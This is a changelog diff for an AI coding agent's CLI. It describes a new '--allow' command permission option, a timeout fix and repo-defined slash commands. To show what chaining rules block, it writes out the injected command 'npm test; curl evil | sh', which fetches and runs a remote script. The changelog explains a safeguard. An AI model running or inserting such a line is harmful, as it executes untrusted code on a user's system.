@@ -1,6 +1,10 @@
 # Changelog
 
 ## Unreleased
+### CLI command execution (`--allow`)
+- `forge-code run "..." --allow "npm test" --allow "npm run lint*"` lets the agent run those commands, so it can run the tests, read the real failures and fix the code (verified end to end with a failing check that the agent repairs). Nothing runs unless allowed; a trailing `*` allows any arguments but never chained, piped, substituted or redirected commands (`npm test*` does not permit `npm test; curl evil | sh`); the catastrophic-command deny list applies even to allowed patterns; background processes are not offered. **Important limit:** the CLI runs commands with a scrubbed environment but without the OS sandbox the desktop app uses, and the tool description tells the model exactly that.
+- `nodeExec` now kills the whole process tree on timeout (it killed only the shell on Linux and macOS, which could leave the call hanging). Verified on Windows locally; the Unix path is checked by CI.
+
 ### Saved prompts / slash commands (research gap #4, the repo-file part)
 - `.forge/prompts/<name>.md` files become slash commands: type `/` in the agent panel for autocomplete (Tab completes), `/review src/a.ts` sends the file's text with `$ARGUMENTS` replaced (arguments are never interpreted as replacement patterns; a body without the placeholder gets the arguments appended). Optional `description:` front matter, else the first line. Unknown `/words` are ordinary text. The CLI expands them too: `forge-code run "/review src/a.ts"`, so a team shares one set of workflows between the app and CI. Unit tests, a real-window e2e, and CLI tests. Not built: skills that carry tools or scripts, and per-user (non-repo) prompts.
 
